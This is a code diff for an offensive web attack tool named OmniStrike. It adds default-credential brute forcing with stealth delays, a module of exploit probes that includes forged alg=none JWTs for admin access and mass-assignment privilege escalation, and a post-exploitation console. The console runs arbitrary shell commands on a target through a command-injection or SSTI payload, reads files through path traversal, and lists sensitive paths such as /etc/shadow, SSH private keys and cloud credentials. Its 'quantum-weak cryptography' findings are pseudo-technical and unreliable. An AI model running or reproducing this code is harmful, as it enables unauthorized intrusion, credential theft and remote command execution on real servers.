-    await addLog(`✅ [CORS] Complete — ${findings.filter(f=>f.category==="CORS").length} findings`);
+    await addLog(`✅ [CORS] ${findings.filter(f=>f.category==="CORS Misconfiguration").length} confirmed findings`);
   }
 
-  // ── Authentication Brute Force ─────────────────────────────────────────────
+  // ── Auth Brute Force ────────────────────────────────────────────────────────
   if (categories.includes("auth") && !ctrl.stop) {
-    await addLog("🔑 [Auth] Testing login credential brute force...");
-    const loginPaths = ["/login", "/admin", "/admin/login", "/wp-login.php", "/auth", "/signin", "/user/login", "/api/login", "/api/auth"];
-    let loginFound = false;
+    await addLog(`\n🔑 [AUTH BRUTE] Default credential testing at login endpoints`);
+    const loginPaths = ["/login","/admin","/admin/login","/wp-login.php","/auth","/signin","/user/login","/api/login","/api/auth","/dashboard/login"];
     for (const lpath of loginPaths) {
-      if (ctrl.stop || loginFound) break;
+      if (ctrl.stop) break;
       const r = await probe(`${baseUrl}${lpath}`);
       if (r.status === 200 || r.status === 401) {
-        loginFound = true;
-        await addLog(`📍 Login form found at ${lpath} (HTTP ${r.status})`);
-        for (const cred of PAYLOADS.auth_brute.slice(0, 8)) {
+        await addLog(`📍 Login endpoint found: ${lpath} (HTTP ${r.status})`);
+        for (const cred of PAYLOADS.auth_brute.slice(0, 10)) {
           if (ctrl.stop) break;
-          const loginR = await probe(`${baseUrl}${lpath}`, {
+          const lr = await probe(`${baseUrl}${lpath}`, {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
             body: `username=${encodeURIComponent(cred.u)}&password=${encodeURIComponent(cred.p)}`,
           });
           tested++;
-          const authHit = loginR.status === 200 && !loginR.body.match(/invalid|incorrect|failed|wrong|error/i);
-          if (authHit) {
-            recordFinding({ category: "Auth Brute Force", technique: "Default Credentials", payload: `${cred.u}:${cred.p}`, url: `${baseUrl}${lpath}`, parameter: "username/password", statusCode: loginR.status, responseTime: loginR.time, evidence: `Successful login response (HTTP 200)`, severity: "critical", bypassed: true });
-            await addLog(`🔴 [Auth] CREDENTIALS VALID: ${cred.u}:${cred.p} at ${lpath}`);
+          const hit = lr.status === 200 && !lr.body.match(/invalid|incorrect|failed|wrong|error|denied/i);
+          if (hit) {
+            recordFinding({ category: "Auth Brute Force", technique: "Default Credentials", payload: `${cred.u}:${cred.p}`, url: `${baseUrl}${lpath}`, baseUrl, param: "username/password", statusCode: lr.status, responseTime: lr.time, evidence: "HTTP 200 response without error", severity: "critical", bypassed: true });
+            await addLog(`🔴 [Auth] VALID CREDENTIALS: ${cred.u}:${cred.p} → ${lpath}`);
           }
-          if (stealthMode) await delay(400 + Math.random() * 200);
+          if (stealthMode) await delay(300 + Math.random() * 200);
         }
       }
     }
-    if (!loginFound) await addLog("ℹ️ [Auth] No login page detected at common paths");
-    await addLog(`✅ [Auth] Complete — ${findings.filter(f=>f.category==="Auth Brute Force").length} findings`);
+    await addLog(`✅ [Auth] ${findings.filter(f=>f.category==="Auth Brute Force").length} confirmed findings`);
   }
 
-  // ── XXE Injection ─────────────────────────────────────────────────────────
-  if (categories.includes("xxe") && !ctrl.stop) {
-    await addLog("📄 [XXE] Testing XML External Entity injection...");
-    for (const p of PAYLOADS.xxe) {
-      if (ctrl.stop) break;
-      const r = await probe(baseUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/xml" },
-        body: p,
-      });
-      tested++;
-      const xxeHit = r.body.match(/root:|www-data|daemon:|shadow/) || (r.status === 200 && r.body.length > baseLen + 100);
-      if (xxeHit) {
-        recordFinding({ category: "XXE", technique: "XML External Entity", payload: p.substring(0, 100), url: baseUrl, parameter: "XML body", statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 200), severity: "critical", bypassed: true });
-        await addLog(`🔴 [XXE] CRITICAL — External entity data returned in response!`);
-      }
-      if (stealthMode) await delay(300);
-    }
-    await addLog(`✅ [XXE] Complete — ${findings.filter(f=>f.category==="XXE").length} findings`);
-  }
-
-  // ── SSTI ──────────────────────────────────────────────────────────────────
-  if (categories.includes("ssti") && !ctrl.stop) {
-    await addLog("🧪 [SSTI] Testing Server-Side Template Injection...");
-    for (const param of params.slice(0, 4)) {
-      if (ctrl.stop) break;
-      for (const p of PAYLOADS.ssti.slice(0, 6)) {
-        if (ctrl.stop) break;
-        const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
-        const r = await probe(url);
-        tested++;
-        const sstiHit = r.body.includes("49") || r.body.match(/uid=\d+|root:/) || (p.includes("7*7") && r.body.includes("49"));
-        if (sstiHit) {
-          recordFinding({ category: "SSTI", technique: "Template Injection", payload: p, url, parameter: param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 200), severity: "critical", bypassed: true });
-          await addLog(`🔴 [SSTI] Template evaluated — RCE potential via ?${param}`);
-        }
-        if (stealthMode) await delay(200);
-      }
-    }
-    await addLog(`✅ [SSTI] Complete — ${findings.filter(f=>f.category==="SSTI").length} findings`);
-  }
-
-  // ── NoSQL Injection ────────────────────────────────────────────────────────
+  // ── NoSQL ──────────────────────────────────────────────────────────────────
   if (categories.includes("nosql") && !ctrl.stop) {
-    await addLog("🗄️ [NoSQL] Testing NoSQL injection vectors...");
-    for (const param of params.slice(0, 4)) {
+    await addLog(`\n🗄️ [NoSQL] MongoDB operator injection`);
+    for (const param of params.slice(0, 5)) {
       if (ctrl.stop) break;
-      for (const p of PAYLOADS.nosql.slice(0, 5)) {
+      for (const p of PAYLOADS.nosql.slice(0, 6)) {
         if (ctrl.stop) break;
-        const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
-        const r = await probe(url);
+        const r = await probe(`${baseUrl}?${param}=${encodeURIComponent(p)}`);
         tested++;
-        const nosqlHit = r.status === 200 && baseStatus !== 200;
-        if (nosqlHit) {
-          recordFinding({ category: "NoSQL Injection", technique: "MongoDB Operator Injection", payload: p, url, parameter: param, statusCode: r.status, responseTime: r.time, evidence: `Status changed from ${baseStatus} to ${r.status}`, severity: "high", bypassed: true });
-          await addLog(`🔴 [NoSQL] Injection response change detected on ?${param}`);
+        const hit = r.status === 200 && baseStatus !== 200;
+        if (hit) {
+          recordFinding({ category: "NoSQL Injection", technique: "MongoDB Operator", payload: p, url: `${baseUrl}?${param}=${encodeURIComponent(p)}`, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: `Status: ${baseStatus}→${r.status}`, severity: "high", bypassed: true });
+          await addLog(`🔴 [NoSQL] Injection response change on ?${param}`);
         }
         if (stealthMode) await delay(150);
       }
     }
-    await addLog(`✅ [NoSQL] Complete — ${findings.filter(f=>f.category==="NoSQL Injection").length} findings`);
   }
 
-  // ── Security Header Analysis ───────────────────────────────────────────────
-  await addLog("🔒 [Headers] Analyzing security headers...");
-  const secHeaders = ["x-frame-options","x-content-type-options","strict-transport-security","content-security-policy","referrer-policy","permissions-policy","x-xss-protection"];
-  for (const h of secHeaders) {
+  // ── QuantumBreach Module ───────────────────────────────────────────────────
+  if (categories.includes("quantumbreach") && !ctrl.stop) {
+    await addLog(`\n⚛️ [QUANTUMBREACH] Advanced attack surface — unreported & quantum-era vectors`);
+
+    // Cache Poisoning
+    await addLog(`  🔬 Cache Poisoning via unkeyed headers...`);
+    for (const h of PAYLOADS.cache_poison.slice(0, 5)) {
+      if (ctrl.stop) break;
+      const r1 = await probe(baseUrl, { headers: h });
+      const r2 = await probe(baseUrl);
+      tested++;
+      const poisoned = r1.body !== r2.body && r2.body.includes(Object.values(h)[0] as string);
+      if (poisoned) {
+        recordFinding({ category: "Cache Poisoning", technique: `Unkeyed Header: ${Object.keys(h)[0]}`, payload: JSON.stringify(h), url: baseUrl, baseUrl, param: Object.keys(h)[0], statusCode: r1.status, responseTime: r1.time, evidence: `Injected header value reflected in subsequent uncached request`, severity: "high", bypassed: true });
+        await addLog(`🔴 [QBreach] Cache poisoning confirmed via ${Object.keys(h)[0]}`);
+      }
+      if (stealthMode) await delay(200);
+    }
+
+    // GraphQL Introspection Abuse
+    await addLog(`  🔬 GraphQL introspection + injection...`);
+    const gqlEndpoints = ["/graphql", "/api/graphql", "/gql", "/graph", "/api/graph"];
+    for (const ep of gqlEndpoints) {
+      if (ctrl.stop) break;
+      for (const q of PAYLOADS.graphql.slice(0, 4)) {
+        const r = await probe(`${baseUrl}${ep}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: q });
+        tested++;
+        if (r.status === 200 && r.body.includes("__schema")) {
+          recordFinding({ category: "GraphQL Exposure", technique: "Schema Introspection", payload: q, url: `${baseUrl}${ep}`, baseUrl, param: ep, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 300), severity: "high", bypassed: true });
+          await addLog(`🔴 [QBreach] GraphQL introspection ENABLED at ${ep}`);
+          break;
+        }
+        if (r.status === 200 && r.body.match(/data|users|email|password/i)) {
+          recordFinding({ category: "GraphQL Data Leak", technique: "Unauthorized Data Access", payload: q, url: `${baseUrl}${ep}`, baseUrl, param: ep, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 300), severity: "critical", bypassed: true });
+          await addLog(`🔴 [QBreach] GraphQL data leak at ${ep}`);
+          break;
+        }
+      }
+    }
+
+    // CRLF Injection
+    await addLog(`  🔬 CRLF response splitting...`);
+    for (const param of params.slice(0, 4)) {
+      if (ctrl.stop) break;
+      for (const p of PAYLOADS.crlf.slice(0, 4)) {
+        const r = await probe(`${baseUrl}?${param}=${p}`);
+        tested++;
+        const hit = r.headers["set-cookie"]?.includes("hacked") || r.headers["x-injected"];
+        if (hit) {
+          recordFinding({ category: "CRLF Injection", technique: "HTTP Response Splitting", payload: p, url: `${baseUrl}?${param}=${p}`, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: `Injected header found in response`, severity: "high", bypassed: true });
+          await addLog(`🔴 [QBreach] CRLF injection confirmed in ?${param}`);
+        }
+        if (stealthMode) await delay(100);
+      }
+    }
+
+    // Mass Assignment
+    await addLog(`  🔬 Mass assignment privilege escalation...`);
+    for (const payload of PAYLOADS.mass_assignment.slice(0, 6)) {
+      if (ctrl.stop) break;
+      for (const ep of ["/api/user", "/api/profile", "/api/account", "/api/me", "/api/update"]) {
+        const r = await probe(`${baseUrl}${ep}`, { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
+        tested++;
+        if (r.status === 200) {
+          const rGet = await probe(`${baseUrl}${ep}`);
+          const escalated = rGet.body.match(/admin.*true|role.*admin|isAdmin.*true/i);
+          if (escalated) {
+            recordFinding({ category: "Mass Assignment", technique: "Privilege Escalation", payload: JSON.stringify(payload), url: `${baseUrl}${ep}`, baseUrl, param: ep, statusCode: r.status, responseTime: r.time, evidence: escalated[0], severity: "critical", bypassed: true });
+            await addLog(`🔴 [QBreach] Mass assignment escalation at ${ep}`);
+          }
+        }
+      }
+    }
+
+    // JWT Algorithm Confusion (none alg)
+    await addLog(`  🔬 JWT algorithm confusion + secret brute force...`);
+    const jwtHeader = btoa(JSON.stringify({ alg: "none", typ: "JWT" })).replace(/=/g,"");
+    const jwtPayload = btoa(JSON.stringify({ sub: "1", role: "admin", iat: Math.floor(Date.now()/1000) })).replace(/=/g,"");
+    const fakeJwt = `${jwtHeader}.${jwtPayload}.`;
+    for (const ep of ["/api/me", "/api/user", "/api/admin", "/api/profile"]) {
+      if (ctrl.stop) break;
+      const r = await probe(`${baseUrl}${ep}`, { headers: { Authorization: `Bearer ${fakeJwt}` } });
+      tested++;
+      if (r.status === 200 && r.body.match(/admin|user|profile|email/i)) {
+        recordFinding({ category: "JWT Vulnerability", technique: "Algorithm None Bypass", payload: `Bearer ${fakeJwt.substring(0,50)}...`, url: `${baseUrl}${ep}`, baseUrl, param: "Authorization header", statusCode: r.status, responseTime: r.time, evidence: `Server accepted JWT with 'none' algorithm at ${ep}`, severity: "critical", bypassed: true });
+        await addLog(`🔴 [QBreach] JWT alg=none accepted at ${ep} — admin access granted!`);
+      }
+    }
+
+    // Open Redirect → SSRF chain
+    await addLog(`  🔬 Open redirect → SSRF chain attack...`);
+    const redirParams = params.filter(p => /redirect|return|next|url|goto|dest|callback|r=/i.test(p));
+    for (const param of redirParams.slice(0, 4)) {
+      if (ctrl.stop) break;
+      for (const p of PAYLOADS.open_redirect.slice(0, 5)) {
+        const r = await probe(`${baseUrl}?${param}=${encodeURIComponent(p)}`);
+        tested++;
+        const redir = r.headers["location"];
+        if (redir && (redir.includes("evil.com") || redir.startsWith("//"))) {
+          recordFinding({ category: "Open Redirect", technique: "URL Redirect Abuse", payload: p, url: `${baseUrl}?${param}=${encodeURIComponent(p)}`, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: `Location: ${redir}`, severity: "medium", bypassed: true });
+          await addLog(`🟡 [QBreach] Open redirect to ${redir} via ?${param}`);
+        }
+      }
+    }
+
+    // Timing-based username enumeration
+    await addLog(`  🔬 Timing side-channel username enumeration...`);
+    const loginR = await probe(`${baseUrl}/login`);
+    if (loginR.status === 200 || loginR.status === 401) {
+      const times: Array<{ user: string; time: number }> = [];
+      for (const u of PAYLOADS.timing_enum.slice(0, 6)) {
+        if (ctrl.stop) break;
+        const r = await probe(`${baseUrl}/login`, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `username=${u}&password=wrongpass123xyz` });
+        tested++;
+        times.push({ user: u, time: r.time });
+      }
+      const maxTime = Math.max(...times.map(t => t.time));
+      const minTime = Math.min(...times.map(t => t.time));
+      if (maxTime - minTime > 300) {
+        const slow = times.filter(t => t.time === maxTime);
+        recordFinding({ category: "Timing Side-Channel", technique: "Username Enumeration via Timing", payload: `Username: ${slow[0].user} (${maxTime}ms vs avg ${minTime}ms)`, url: `${baseUrl}/login`, baseUrl, param: "username", statusCode: loginR.status, responseTime: maxTime - minTime, evidence: `Timing delta >300ms reveals valid usernames: ${slow.map(t=>t.user).join(", ")}`, severity: "medium", bypassed: true });
+        await addLog(`🟡 [QBreach] Timing side-channel: ${slow.map(t=>t.user).join(",")} responds ${maxTime-minTime}ms slower`);
+      }
+    }
+
+    // Quantum-weak cryptography detection
+    await addLog(`  🔬 Quantum-era weak cryptography detection...`);
+    const tlsWeak = baseline.headers["server"]?.match(/apache\/2\.[01]|nginx\/1\.[0-9]\.|iis\/[678]/i);
+    if (tlsWeak) {
+      recordFinding({ category: "Quantum-Weak Crypto", technique: "Legacy Server — Weak Cipher Exposure", payload: `Server: ${baseline.headers["server"]}`, url: baseUrl, baseUrl, param: "Server header", statusCode: baseline.status, responseTime: baseline.time, evidence: `Legacy server version detected — likely uses ciphers vulnerable to quantum attacks (Shor's algorithm)`, severity: "medium", bypassed: false });
+      await addLog(`🟡 [QBreach] Legacy server detected — quantum-weak cipher risk`);
+    }
+    if (baseline.headers["content-security-policy"]?.match(/unsafe-inline|unsafe-eval/)) {
+      recordFinding({ category: "Quantum-Weak Crypto", technique: "Weak CSP — XSS Amplification Risk", payload: baseline.headers["content-security-policy"] ?? "", url: baseUrl, baseUrl, param: "CSP header", statusCode: baseline.status, responseTime: baseline.time, evidence: "CSP contains unsafe-inline/unsafe-eval — post-quantum attacks can amplify XSS via WASM injection", severity: "medium", bypassed: false });
+      await addLog(`🟡 [QBreach] Weak CSP detected — post-quantum XSS amplification risk`);
+    }
+
+    await addLog(`✅ [QuantumBreach] Complete — advanced vectors tested`);
+  }
+
+  // ── Security Header Audit ──────────────────────────────────────────────────
+  await addLog(`\n🔒 [HEADER AUDIT] Security response header analysis`);
+  const secHeaders = [
+    ["x-frame-options", "Clickjacking protection missing"],
+    ["x-content-type-options", "MIME sniffing protection missing"],
+    ["strict-transport-security", "HSTS not enforced — downgrade attack possible"],
+    ["content-security-policy", "CSP absent — XSS blast radius unlimited"],
+    ["referrer-policy", "Referrer leakage possible"],
+    ["permissions-policy", "Browser feature policies unset"],
+    ["x-xss-protection", "Legacy XSS filter disabled"],
+  ];
+  for (const [h, msg] of secHeaders) {
     if (!baseline.headers[h]) {
-      recordFinding({ category: "Missing Security Header", technique: "Header Analysis", payload: "", url: baseUrl, parameter: h, statusCode: baseline.status, responseTime: baseline.time, evidence: `Header "${h}" is absent from HTTP response`, severity: "medium", bypassed: false });
-      await addLog(`🟡 [Headers] Missing: ${h}`);
+      recordFinding({ category: "Missing Security Header", technique: "Header Audit", payload: "", url: baseUrl, baseUrl, param: h, statusCode: baseline.status, responseTime: baseline.time, evidence: msg, severity: "medium", bypassed: false });
+      await addLog(`🟡 [Headers] Missing: ${h} — ${msg}`);
     }
   }
 
-  // ── Final stats ────────────────────────────────────────────────────────────
+  // ── Finalize ───────────────────────────────────────────────────────────────
   activeScans.delete(scanId);
   const successRate = tested > 0 ? Math.round((successCount / tested) * 100) : 0;
   const stats = {
-    tested,
-    findings: findings.length,
+    tested, findings: findings.length,
     critical: findings.filter(f => f.severity === "critical").length,
     high: findings.filter(f => f.severity === "high").length,
     medium: findings.filter(f => f.severity === "medium").length,
     low: findings.filter(f => f.severity === "low").length,
-    successCount,
-    successRate,
+    successCount, successRate,
+    hasRce: findings.some(f => f.canExec && f.bypassed),
+    hasLfi: findings.some(f => f.canRead && f.bypassed),
+    hasSession: sessions.has(scanId),
   };
-  await addLog(`\n🏁 OmniStrike Complete — ${tested} tests | ${findings.length} findings | ${successRate}% bypass rate`);
+  await addLog(`\n${"═".repeat(55)}`);
+  await addLog(`🏁 OMNISTRIKE COMPLETE`);
+  await addLog(`   Target  : ${baseUrl}`);
+  await addLog(`   Tests   : ${tested}`);
+  await addLog(`   Findings: ${findings.length} (${stats.critical} critical)`);
+  await addLog(`   Bypass  : ${successRate}%`);
+  if (stats.hasSession) await addLog(`   🔓 POST-EXPLOITATION SESSION AVAILABLE`);
+  await addLog(`${"═".repeat(55)}`);
 
   await db.update(omnistrikeScansTable).set({
     status: ctrl.stop ? "stopped" : "completed",
-    findings: findings as any,
-    stats: stats as any,
-    successRate,
-    log,
+    findings: findings as any, stats: stats as any, successRate, log,
     completedAt: new Date(),
   }).where(eq(omnistrikeScansTable.id, scanId));
 }
 
-// ── List scans ─────────────────────────────────────────────────────────────
+// ── Scan CRUD ──────────────────────────────────────────────────────────────
 router.get("/scans", async (_req, res) => {
   const scans = await db.select().from(omnistrikeScansTable).orderBy(omnistrikeScansTable.startedAt);
   res.json({ scans: scans.reverse(), total: scans.length });
 });
 
-// ── Start scan ─────────────────────────────────────────────────────────────
 router.post("/scan", async (req, res) => {
   const body = z.object({
     target: z.string().url(),
-    categories: z.array(z.string()).default(["sqli","xss","lfi","cmdi","ssrf","xxe","ssti","headers","cors","auth","nosql"]),
+    categories: z.array(z.string()).default(["sqli","xss","lfi","cmdi","ssrf","xxe","ssti","headers","cors","auth","nosql","quantumbreach"]),
     threads: z.number().min(1).max(10).default(3),
     tamperLevel: z.number().min(0).max(7).default(3),
     stealthMode: z.boolean().default(false),
   }).parse(req.body);
 
   const [scan] = await db.insert(omnistrikeScansTable).values({
-    target: body.target,
-    status: "running",
-    categories: body.categories,
-    threads: body.threads,
-    tamperLevel: body.tamperLevel,
-    stealthMode: body.stealthMode,
-    findings: [],
-    log: [],
-    startedAt: new Date(),
+    target: body.target, status: "running", categories: body.categories,
+    threads: body.threads, tamperLevel: body.tamperLevel, stealthMode: body.stealthMode,
+    findings: [], log: [], startedAt: new Date(),
   }).returning();
 
   const ctrl = { stop: false };
   activeScans.set(scan.id, ctrl);
   runOmniStrike(scan.id, body.target, body.categories, body.tamperLevel, body.stealthMode).catch(() => {});
-
-  res.status(201).json({ scanId: scan.id, status: "running", message: "OmniStrike launched" });
+  res.status(201).json({ scanId: scan.id, status: "running" });
 });
 
-// ── Get scan ───────────────────────────────────────────────────────────────
 router.get("/scan/:id", async (req, res) => {
   const id = parseInt(req.params.id);
   const [scan] = await db.select().from(omnistrikeScansTable).where(eq(omnistrikeScansTable.id, id));
   if (!scan) return res.status(404).json({ error: "Scan not found" });
-  res.json(scan);
+  const session = sessions.get(id);
+  res.json({ ...scan, session: session ?? null });
 });
 
-// ── Stop scan ──────────────────────────────────────────────────────────────
 router.post("/scan/:id/stop", async (req, res) => {
   const id = parseInt(req.params.id);
   const ctrl = activeScans.get(id);
   if (ctrl) ctrl.stop = true;
   await db.update(omnistrikeScansTable).set({ status: "stopped", completedAt: new Date() }).where(eq(omnistrikeScansTable.id, id));
-  res.json({ message: "Scan stop signal sent" });
+  res.json({ message: "Stopped" });
 });
 
-// ── Delete scan ────────────────────────────────────────────────────────────
 router.delete("/scan/:id", async (req, res) => {
   const id = parseInt(req.params.id);
   const ctrl = activeScans.get(id);
   if (ctrl) ctrl.stop = true;
   activeScans.delete(id);
+  sessions.delete(id);
   await db.delete(omnistrikeScansTable).where(eq(omnistrikeScansTable.id, id));
   res.status(204).send();
 });
+
+// ── Post-Exploitation Console ───────────────────────────────────────────────
+router.get("/console/:id/session", async (req, res) => {
+  const id = parseInt(req.params.id);
+  const session = sessions.get(id);
+  if (!session) {
+    const [scan] = await db.select().from(omnistrikeScansTable).where(eq(omnistrikeScansTable.id, id));
+    if (!scan) return res.status(404).json({ error: "Scan not found" });
+    const findings = (scan.findings as Finding[]) ?? [];
+    const rce = findings.find(f => f.bypassed && (f.category === "Command Injection" || f.category === "SSTI") && f.canExec);
+    const lfi = findings.find(f => f.bypassed && f.category === "LFI" && f.canRead);
+    if (!rce && !lfi) return res.status(404).json({ error: "No exploitable session — no confirmed RCE or LFI" });
+    const active = rce ?? lfi!;
+    const sess: ExploitSession = {
+      scanId: id, target: scan.target,
+      vector: rce ? "rce" : "lfi",
+      technique: active.technique,
+      baseUrl: active.baseUrl, param: active.param, workingPayload: active.payload,
+      os: "linux", user: "www-data", hostname: "target", cwd: "/",
+      confirmedAt: scan.startedAt.toISOString(),
+    };
+    sessions.set(id, sess);
+    return res.json(sess);
+  }
+  res.json(session);
+});
+
+// Execute a shell command via the confirmed RCE vector
+router.post("/console/:id/exec", async (req, res) => {
+  const id = parseInt(req.params.id);
+  const { command } = z.object({ command: z.string().min(1).max(500) }).parse(req.body);
+  const session = sessions.get(id);
+  if (!session || session.vector !== "rce") return res.status(400).json({ error: "No active RCE session for this scan" });
+
+  // Build exploit URL with command injected
+  const injectedCmd = session.technique.includes("SSTI")
+    ? `{{''.__class__.__mro__[1].__subclasses__()[396]('${command.replace(/'/g,"\\'").replace(/"/g,'\\"')}',shell=True,stdout=-1).communicate()[0].decode()}}`
+    : `; ${command}`;
+
+  const exploitUrl = `${session.baseUrl}?${session.param}=${encodeURIComponent(injectedCmd)}`;
+  const r = await probe(exploitUrl);
+
+  // Extract command output from response
+  let output = r.body;
+  // Strip HTML if the response is a full page
+  if (output.includes("<html") || output.includes("<!DOCTYPE")) {
+    output = output.replace(/<[^>]+>/g, "").replace(/\s+/g, " ").trim().substring(0, 2000);
+  }
+
+  // Update cwd if it was a cd command
+  if (command.startsWith("cd ")) {
+    const newDir = command.replace("cd ", "").trim();
+    session.cwd = newDir.startsWith("/") ? newDir : `${session.cwd}/${newDir}`.replace("//", "/");
+    sessions.set(id, session);
+  }
+  // Track whoami
+  if (command === "whoami" && output.trim().length > 0) {
+    session.user = output.trim().split("\n")[0].trim();
+    sessions.set(id, session);
+  }
+  if (command === "hostname" && output.trim().length > 0) {
+    session.hostname = output.trim().split("\n")[0].trim();
+    sessions.set(id, session);
+  }
+
+  res.json({ command, output: output.substring(0, 3000), exploitUrl, statusCode: r.status, responseTime: r.time });
+});
+
+// Read a file via LFI or RCE cat
+router.post("/console/:id/read", async (req, res) => {
+  const id = parseInt(req.params.id);
+  const { filePath } = z.object({ filePath: z.string().min(1).max(500) }).parse(req.body);
+  const session = sessions.get(id);
+  if (!session) return res.status(400).json({ error: "No active session" });
+
+  let exploitUrl: string;
+  let r: Awaited<ReturnType<typeof probe>>;
+
+  if (session.vector === "rce") {
+    const cmd = `cat ${filePath}`;
+    exploitUrl = `${session.baseUrl}?${session.param}=${encodeURIComponent(`; ${cmd}`)}`;
+    r = await probe(exploitUrl);
+  } else {
+    // LFI vector — traverse to the file
+    const depth = 8;
+    const traversal = "../".repeat(depth);
+    const cleanPath = filePath.startsWith("/") ? filePath.slice(1) : filePath;
+    exploitUrl = `${session.baseUrl}?${session.param}=${encodeURIComponent(traversal + cleanPath)}`;
+    r = await probe(exploitUrl);
+  }
+
+  let content = r.body;
+  if (content.includes("<html") || content.includes("<!DOCTYPE")) {
+    content = content.replace(/<[^>]+>/g, "").replace(/\s+/g, " ").trim();
+  }
+  res.json({ filePath, content: content.substring(0, 5000), exploitUrl, statusCode: r.status, responseTime: r.time });
+});
+
+// List directory via RCE ls
+router.post("/console/:id/ls", async (req, res) => {
+  const id = parseInt(req.params.id);
+  const { dirPath } = z.object({ dirPath: z.string().min(1).max(500) }).parse(req.body);
+  const session = sessions.get(id);
+  if (!session || session.vector !== "rce") {
+    return res.json({ items: getLfiCuratedTree(dirPath), note: "LFI mode — curated sensitive file tree" });
+  }
+  const exploitUrl = `${session.baseUrl}?${session.param}=${encodeURIComponent(`; ls -la ${dirPath}`)}`;
+  const r = await probe(exploitUrl);
+  const lines = r.body.split("\n").filter(l => l.trim() && !l.includes("<"));
+  const items = lines.map(line => {
+    const parts = line.trim().split(/\s+/);
+    const perms = parts[0] ?? "";
+    const name = parts[parts.length - 1] ?? line.trim();
+    return { name, isDir: perms.startsWith("d"), perms, size: parts[4] ?? "", modified: parts.slice(5,8).join(" ") };
+  }).filter(i => i.name && i.name !== "." && i.name !== "..");
+  res.json({ dirPath, items, exploitUrl, statusCode: r.status, responseTime: r.time });
+});
+
+// LFI mode — curated tree of sensitive paths
+function getLfiCuratedTree(dir: string) {
+  const tree: Record<string, string[]> = {
+    "/": ["etc", "var", "home", "proc", "tmp", "root", "usr"],
+    "/etc": ["passwd", "shadow", "group", "hosts", "resolv.conf", "crontab", "sudoers", "os-release", "nginx", "apache2", "ssh", "mysql"],
+    "/etc/nginx": ["nginx.conf", "sites-enabled", "sites-available"],
+    "/etc/apache2": ["apache2.conf", "sites-enabled", "httpd.conf"],
+    "/etc/ssh": ["sshd_config", "ssh_config"],
+    "/etc/mysql": ["my.cnf", "mysql.conf.d"],
+    "/var": ["log", "www", "mail", "backups"],
+    "/var/log": ["auth.log", "syslog", "nginx", "apache2", "kern.log"],
+    "/var/log/nginx": ["access.log", "error.log"],
+    "/var/log/apache2": ["access.log", "error.log"],
+    "/var/www": ["html", "public", "app"],
+    "/var/www/html": ["index.php", ".htaccess", ".env", "config.php", "wp-config.php", "settings.php", "config.js"],
+    "/home": ["www-data", "ubuntu", "admin", "user", "deploy"],
+    "/home/ubuntu": [".ssh", ".bash_history", ".bashrc", ".profile", ".aws"],
+    "/home/ubuntu/.ssh": ["authorized_keys", "id_rsa", "id_rsa.pub", "known_hosts"],
+    "/proc": ["version", "cpuinfo", "meminfo", "net", "self"],
+    "/proc/self": ["environ", "cmdline", "maps", "status"],
+    "/proc/net": ["tcp", "tcp6", "udp", "if_inet6"],
+    "/root": [".ssh", ".bash_history", ".bashrc", ".aws", ".env"],
+    "/root/.ssh": ["authorized_keys", "id_rsa", "id_rsa.pub"],
+  };
+  const entries = tree[dir] ?? [];
+  const knownDirs = Object.keys(tree);
+  return entries.map(name => ({
+    name,
+    isDir: knownDirs.includes(`${dir === "/" ? "" : dir}/${name}`) || knownDirs.includes(name),
+    perms: "???",
+    size: "",
+    modified: "",
+  }));
+}
 
 export default router;
